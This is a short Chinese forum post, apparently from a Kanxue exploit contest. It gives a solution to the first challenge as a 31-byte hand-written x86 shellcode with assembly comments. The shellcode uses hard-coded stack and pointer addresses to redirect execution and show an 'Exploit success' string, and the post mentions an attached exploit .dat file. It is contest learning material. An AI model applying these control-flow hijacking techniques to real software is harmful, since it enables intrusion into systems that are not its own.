
# 我也来发发第一题的解答

> 原文：[`www.pediy.com/kssd/pediy11/122913.html`](https://www.pediy.com/kssd/pediy11/122913.html)

除了该死的堆栈指针没办法，其余基本不用硬编码 ![](img/cda69129882b40377a87144c782680e1.jpg "微笑")

代码:

```
dd xx xx xx 00                ;指针 2，跳到下面
5a            pop edx          ;获取代码段地址
6a 00            push 0
ff 72 57          push dword ptr \[edx + 57\] ;"ExploitMe"的偏移
83 c2 60           add edx, 0x60                 ;4011cc 的偏移
ff d2            call edx                                ;push 下面字符串的地址到堆栈，再跳到 4011cc~
dd 45 00 78 00 70 00 6c 00 6f 00 69 00 74 00 20 00 73 00 75 00 63 00 63 00 65 00 73 00 73 00 00 00 ;字符串
dd xx xx xx 00 ;->入口,跳到指针 2
```

31 字节
补上 dat 文件，注意本家的 win sp3 堆栈基址是 `0x140000`,可能是 DEP 的原因，如果在 `0x130000` 机子上跑要更改两个指针

上传的附件

| ![](img/0623e01110d741fd20f66acbc8ec6f9d.jpg) || exploit.rar |
